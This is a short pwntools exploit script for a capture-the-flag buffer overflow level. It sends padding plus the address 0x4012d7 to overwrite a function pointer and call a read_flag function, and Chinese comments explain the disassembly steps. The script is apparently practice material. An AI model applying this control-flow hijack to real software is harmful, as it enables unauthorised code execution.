from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/buffer-overflow-level1.1"
p = process(challenge_path)

# create string
shellcode="123456789012345612345678"+chr(0xd7)+chr(0x12)+chr(0x40)+chr(0x00)
p.sendlineafter("Give me your input\n",shellcode)

# 接收题目的输出
result = p.recvall()

# 打印题目的输出
print(result)
'''
读源码 反汇编
和上一题差不多，只不过把溢出的数据改为函数地址
void (*fp)() = test;意思是定义函数指针指向test函数，这样通过fp();就可以直接调用test函数
需要溢出数据指向readflag函数地址（disassemble read_flag,b read_flag）0x4012d7
'''